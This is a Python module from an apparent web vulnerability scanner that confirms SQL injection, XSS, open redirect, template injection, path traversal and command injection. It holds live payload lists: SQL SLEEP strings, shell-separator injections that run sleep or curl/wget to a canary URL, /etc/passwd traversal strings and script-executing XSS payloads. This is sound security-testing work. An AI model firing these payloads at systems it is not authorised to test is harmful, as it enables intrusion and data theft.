"""Per-class confirmation strategies (Phase 2 T2.1).

Each strategy declares its `vuln_class` and the `mechanism` it uses, and confirms a
candidate deterministically or returns None (fail-closed — never a guess). New
classes are added as new strategies (and, later, plugin `register_oracle` hooks).
"""

from __future__ import annotations

import re
import secrets

from fuzzlab.oracle.baseline import build_baseline
from fuzzlab.oracle.browser import (
    SENTINEL,
    BrowserExecutor,
    ExecObservation,
    ExecRequest,
    StoreStep,
)
from fuzzlab.oracle.context import breakout_for, is_unescaped, type_reflection
from fuzzlab.oracle.oob import OobListener
from fuzzlab.oracle.probe import Candidate, Sender, Verdict

# --- error signatures (M2) ---------------------------------------------------
SQL_ERROR_SIGNATURES = [
    (re.compile(r"you have an error in your sql syntax", re.I), "MySQL"),
    (re.compile(r"warning:\s*mysqli?_", re.I), "MySQL"),
    (re.compile(r"sql syntax.*mariadb", re.I), "MariaDB"),
    (re.compile(r"unclosed quotation mark after the character string", re.I), "MSSQL"),
    (re.compile(r"quoted string not properly terminated", re.I), "Oracle"),
    (re.compile(r"pg_query\(\)|postgresql.*error|syntax error at or near", re.I), "PostgreSQL"),
    (re.compile(r"sqlite_error|sqlite3?::|unrecognized token", re.I), "SQLite"),
]

# --- timing templates (M1); {d} = requested delay in seconds ------------------
_TIMING_TEMPLATES = [
    "1 AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)-- -",
    "1) AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)-- -",
    "1' OR SLEEP({d})-- -",
]

# Command-injection timing templates (shell separators; {d} = delay seconds).
_CMDI_TIMING_TEMPLATES = [
    "; sleep {d}",
    "| sleep {d}",
    "|| sleep {d}",
    "& sleep {d}",
    "&& sleep {d}",
    "$(sleep {d})",
    "`sleep {d}`",
    "1; sleep {d}",
]

# Command-injection OOB templates (M8; {url} = the loopback canary URL). Shell
# separators pair with tools any target OS's shell/base image is overwhelmingly
# likely to have (curl/wget), so this needs no DNS component.
_CMDI_OOB_TEMPLATES = [
    "; curl {url}",
    "| curl {url}",
    "|| curl {url}",
    "& curl {url}",
    "&& curl {url}",
    "$(curl {url})",
    "`curl {url}`",
    "; wget -q -O- {url}",
]

# Open-redirect body sinks (meta refresh) and /etc/passwd content marker (M7).
_META_REFRESH = re.compile(r"http-equiv=[\"']?refresh[\"']?[^>]*url=([^\"'>\s]+)", re.I)
_PASSWD_MARKER = re.compile(r"root:.*?:0:0:", re.M)
_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../etc/passwd%00",
]


def _ssti_payloads(expr: str) -> list[str]:
    """Payloads that evaluate `expr` across common template engines."""
    return ["${" + expr + "}", "{{" + expr + "}}", "<%= " + expr + " %>",
            "#{" + expr + "}", "${{" + expr + "}}"]


def _token() -> str:
    return secrets.token_hex(4)


class ConfirmationStrategy:
    vuln_class: str = ""
    mechanism: str = ""
    category: str = ""

    @property
    def arm(self) -> str:
        """Stable scheduler arm id (unique even when a mechanism spans classes)."""
        return f"{self.vuln_class}:{self.mechanism}"

    def applies(self, candidate: Candidate) -> bool:
        # Prefer category scoping (a candidate's category can have several strategies,
        # e.g. reflected/stored/DOM XSS); fall back to vuln_class for direct use.
        if candidate.category is not None:
            return candidate.category == self.category
        return candidate.vuln_class in (None, self.vuln_class)

    def confirm(self, candidate: Candidate, sender: Sender) -> Verdict | None:  # pragma: no cover
        raise NotImplementedError

    @staticmethod
    def _send(sender: Sender, candidate: Candidate, value: str,
              timing: bool = False):
        """Send a probe for the candidate, honoring its method/location.

        Backward-compatible: a plain GET/query candidate uses the old
        ``send(url, param, value, timing=)`` signature (so existing senders and test
        fakes are unaffected); only a POST/body (or other non-default) candidate
        passes ``method``/``location`` through.
        """
        if candidate.method == "GET" and candidate.location == "query":
            return sender.send(candidate.url, candidate.param, value, timing=timing)
        return sender.send(candidate.url, candidate.param, value, timing=timing,
                           method=candidate.method, location=candidate.location)

    # --- shared rising-delay timing confirmation (M1) ------------------------
    delays = (2, 4)
    baseline_samples = 3
    k = 3.0
    floor = 1.5           # seconds of added delay required above baseline
    tolerance = 0.6       # measured latency may fall this far short of the request

    def _confirm_timing(self, candidate: Candidate, sender: Sender,
                        templates: list[str]) -> Verdict | None:
        """Confirm a time-based injection: latency must rise with the requested delay.

        Shared by SQLi (SQL SLEEP) and command injection (shell sleep). Robust
        baseline (median/MAD), a floor above jitter, and a rising-delay check across
        two requested delays — never one slow response.
        """
        base = build_baseline([
            self._send(sender, candidate, "1", timing=True).elapsed
            for _ in range(self.baseline_samples)
        ])
        for template in templates:
            measured, ok = {}, True
            for d in self.delays:
                probe = self._send(sender, candidate, template.format(d=d), timing=True)
                measured[d] = probe.elapsed
                if not base.exceeds(probe.elapsed, k=self.k, floor=self.floor):
                    ok = False
                    break
                if probe.elapsed < d - self.tolerance:      # latency tracks the request
                    ok = False
                    break
            if ok and measured[self.delays[-1]] > measured[self.delays[0]]:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"baseline_median": round(base.median, 4),
                                "measured": {str(k): round(v, 4) for k, v in measured.items()},
                                "template": template})
        return None


class SqliErrorStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "error-signature"
    category = "sql-injection"
    _probes = ("'", '"', "')", "1'")

    def confirm(self, candidate, sender):
        for payload in self._probes:
            probe = self._send(sender, candidate, payload)
            for rx, dbms in SQL_ERROR_SIGNATURES:
                match = rx.search(probe.text or "")
                if match:
                    return Verdict(True, self.vuln_class, self.mechanism,
                                   {"dbms": dbms, "payload": payload,
                                    "match": match.group(0)[:120]})
        return None


class SqliBooleanStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "boolean-differential"
    category = "sql-injection"

    @staticmethod
    def _similar(a: str, b: str, rel: float = 0.05, absolute: int = 24) -> bool:
        return abs(len(a) - len(b)) <= max(absolute, rel * max(len(a), len(b), 1))

    def confirm(self, candidate, sender):
        benign = self._send(sender, candidate, "1")
        true_p = self._send(sender, candidate, "1 AND 1=1")
        false_p = self._send(sender, candidate, "1 AND 1=2")
        # A true condition looks like the benign page; a false condition does not.
        if self._similar(benign.text, true_p.text) and not self._similar(true_p.text, false_p.text):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"len_benign": len(benign.text), "len_true": len(true_p.text),
                            "len_false": len(false_p.text)})
        return None


class SqliTimingStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "differential-timing"
    category = "sql-injection"

    def confirm(self, candidate, sender):
        return self._confirm_timing(candidate, sender, _TIMING_TEMPLATES)


class ReflectedXssStrategy(ConfirmationStrategy):
    vuln_class = "xss-reflected"
    mechanism = "reflected-context"
    category = "xss"

    def confirm(self, candidate, sender):
        token = _token()
        marker = f"zqxm{token}"
        first = self._send(sender, candidate, marker)
        context = candidate.sink_context or type_reflection(first.text, marker)
        if context == "none":
            return None
        breakout = breakout_for(context, f"zqxb{token}")
        if breakout is None:
            return None
        fragment, signature = breakout
        second = self._send(sender, candidate, fragment)
        if is_unescaped(second.text, signature):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"context": context, "signature": signature})
        return None


class OpenRedirectStrategy(ConfirmationStrategy):
    """M9: the parameter controls the redirect target (Location or meta refresh)."""
    vuln_class = "open-redirect"
    mechanism = "redirect-target-control"
    category = "open-redirect"

    @staticmethod
    def _header(probe, name):
        return next((v for k, v in probe.headers.items() if k.lower() == name), "")

    def confirm(self, candidate, sender):
        canary = f"https://oracle{_token()}.example/cb"
        probe = self._send(sender, candidate, canary)
        location = self._header(probe, "location")
        if location.startswith(canary):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"sink": "location-header", "location": location[:200]})
        m = _META_REFRESH.search(probe.text or "")
        if m and m.group(1).startswith(canary):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"sink": "meta-refresh", "url": m.group(1)[:200]})
        return None


class SstiStrategy(ConfirmationStrategy):
    """M4: a template expression is evaluated server-side (product appears, not the literal)."""
    vuln_class = "ssti"
    mechanism = "evaluation-marker"
    category = "server-side-template-injection"

    def confirm(self, candidate, sender):
        a, b = secrets.randbelow(900) + 100, secrets.randbelow(900) + 100
        expr, product = f"{a}*{b}", str(a * b)
        for payload in _ssti_payloads(expr):
            text = self._send(sender, candidate, payload).text or ""
            if product in text and expr not in text:      # evaluated, not just reflected
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"payload": payload, "product": product})
        return None


class PathTraversalStrategy(ConfirmationStrategy):
    """M7: a file-content marker (/etc/passwd) appears in the response."""
    vuln_class = "file-inclusion"
    mechanism = "file-content-marker"
    category = "file-inclusion"

    def confirm(self, candidate, sender):
        for payload in _TRAVERSAL_PAYLOADS:
            if _PASSWD_MARKER.search(self._send(sender, candidate, payload).text or ""):
                return Verdict(True, self.vuln_class, self.mechanism, {"payload": payload})
        return None


class CommandInjectionStrategy(ConfirmationStrategy):
    """M1 (timing): a shell `sleep` executes, latency rising with the requested delay."""
    vuln_class = "command-injection"
    mechanism = "differential-timing"
    category = "command-injection"

    def confirm(self, candidate, sender):
        return self._confirm_timing(candidate, sender, _CMDI_TIMING_TEMPLATES)


class CommandInjectionOobStrategy(ConfirmationStrategy):
    """M8: blind command injection confirmed by an out-of-band callback.

    For the blind case where no timing skew or response difference is
    observable (output suppressed, egress delayed): embed a unique loopback
    canary URL in a shell-fetch payload and confirm only if that exact token
    is later requested. Needs an injected, already-started `OobListener`
    (lab loopback only, default-off, same seam shape as the M6
    `BrowserExecutor`); without one this strategy no-ops (fail-closed), never
    reaching for a real network listener on its own.
    """
    vuln_class = "command-injection"
    mechanism = "oob-callback"
    category = "command-injection"

    def __init__(self, listener: OobListener | None = None, timeout: float = 1.5):
        self._listener = listener
        self._timeout = timeout

    def confirm(self, candidate, sender):
        if self._listener is None:
            return None
        for template in _CMDI_OOB_TEMPLATES:
            token = self._listener.register()
            canary = self._listener.callback_url(token)
            self._send(sender, candidate, template.format(url=canary))
            hit = self._listener.wait_for(token, timeout=self._timeout)
            if hit is not None:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"canary": canary, "template": template,
                                "hit_path": hit.path, "remote_addr": hit.remote_addr})
        return None


# --- browser-execution XSS (M6): stored + DOM. Need an injected BrowserExecutor. ---
def _xss_exec_payloads(token: str) -> list[str]:
    """Payloads that, if they execute, call the sentinel with the token."""
    call = f"{SENTINEL}('{token}')"
    return [
        f"<img src=x onerror=\"{call}\">",
        f"\"><img src=x onerror=\"{call}\">",
        f"<svg onload=\"{call}\">",
        f"<script>{call}</script>",
    ]


class _BrowserXssStrategy(ConfirmationStrategy):
    """Shared M6 logic: place a tokened payload, execute in a browser, confirm on fire."""
    category = "xss"

    def __init__(self, executor: BrowserExecutor | None = None):
        self._executor = executor

    def _observe(self, candidate: Candidate, payload: str, token: str) -> ExecObservation:
        raise NotImplementedError

    def confirm(self, candidate, sender):
        if self._executor is None:
            return None                       # no browser available -> cannot confirm
        for payload in _xss_exec_payloads((token := _token())):
            obs = self._observe(candidate, payload, token)
            if obs.executed:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"payload": payload, "detail": obs.detail})
        return None


class DomXssStrategy(_BrowserXssStrategy):
    """M6: payload in the URL (query/fragment) executes client-side (no server round-trip)."""
    vuln_class = "xss-dom"
    mechanism = "browser-execution"

    def _observe(self, candidate, payload, token):
        location = candidate.location if candidate.location in ("query", "fragment") else "query"
        return self._executor.run(
            ExecRequest(url=candidate.url, param=candidate.param, value=payload,
                        location=location), token)


class StoredXssStrategy(_BrowserXssStrategy):
    """M6: payload stored via one request, executes when the render page is loaded."""
    vuln_class = "xss-stored"
    mechanism = "browser-execution"

    def _observe(self, candidate, payload, token):
        if not candidate.store_url:
            return ExecObservation(False)     # need the store endpoint (source_url)
        store = StoreStep(url=candidate.store_url, param=candidate.store_param or candidate.param,
                          value=payload, method=candidate.store_method,
                          location=candidate.store_location)
        return self._executor.run(ExecRequest(url=candidate.url, store=store), token)


def default_strategies(browser: BrowserExecutor | None = None,
                       oob: OobListener | None = None) -> list[ConfirmationStrategy]:
    """Cheapest/strongest first, per category. `applies()` scopes each to its category.

    The M6 browser strategies are included with the injected ``browser`` (or without,
    in which case they no-op — stored/DOM XSS stays unconfirmed until a browser is
    set). Likewise the M8 OOB strategy is included with the injected, already-started
    ``oob`` listener (or without, in which case it no-ops — blind command injection
    still confirms via M1 timing, just not via OOB callback).
    """
    return [SqliErrorStrategy(), SqliBooleanStrategy(), SqliTimingStrategy(),
            ReflectedXssStrategy(), DomXssStrategy(browser), StoredXssStrategy(browser),
            OpenRedirectStrategy(), SstiStrategy(),
            PathTraversalStrategy(), CommandInjectionStrategy(),
            CommandInjectionOobStrategy(oob)]


# Reference-style category -> the oracle vuln_class we have a strategy for.
# Categories absent here have no confirmer yet (candidate emitted, not confirmed).
# Categories the oracle can confirm -> a representative class (the value is a hint;
# the pipeline scopes strategies by `category`, and 'xss' fans out to reflected +
# stored + DOM). A category absent here has no confirmer yet.
_CATEGORY_TO_CLASS = {
    "sql-injection": "sqli",
    "xss": "xss-reflected",
    "open-redirect": "open-redirect",
    "server-side-template-injection": "ssti",
    "file-inclusion": "file-inclusion",
    "command-injection": "command-injection",
}


def category_to_oracle_class(category: str) -> str | None:
    return _CATEGORY_TO_CLASS.get(category)
